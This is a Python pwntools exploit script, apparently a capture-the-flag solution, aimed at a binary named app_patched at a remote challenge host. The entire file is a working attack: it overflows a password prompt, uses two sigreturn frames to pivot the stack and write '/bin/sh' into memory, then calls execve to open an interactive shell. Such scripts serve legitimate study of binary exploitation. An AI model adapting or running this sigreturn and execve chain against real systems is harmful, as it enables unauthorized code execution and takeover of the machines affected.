#!/usr/bin/env python3
from pwn import *

exe = ELF("./app_patched")
context.binary = exe

gs = """
b *main
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gs)
    else:
        r = remote("0.cloud.chals.io", 23534)
    return r


offset     = 40

pop_rax = 0x401337
piv_add = 0x4040b0
syscall = 0x401339

binsh    = b"/bin/sh\x00"

def main():
    r = conn()

    frame1 = SigreturnFrame()
    frame1.rdi = 0
    frame1.rsi = piv_add
    frame1.rdx = 0x200
    frame1.rax = 0
    frame1.rsp = piv_add +0x10
    frame1.rip = syscall

    payload1 = flat(
        b"A" * offset,
        pop_rax, 15,
        syscall,
        bytes(frame1)
    )

    r.sendlineafter(b"[?] Select user:", b"alice")
    r.sendlineafter(b"[?] Enter password for", payload1)


    frame2 = SigreturnFrame()
    frame2.rdi = piv_add
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rax = 0x3b
    frame2.rip = syscall
    
    payload2 = flat(
        binsh,
        b"\x00" * (0x10 - 0x8),
        pop_rax, 15,
        syscall,
        bytes(frame2)
    )

    r.send(payload2)
    r.interactive()

if __name__ == "__main__":
    main()
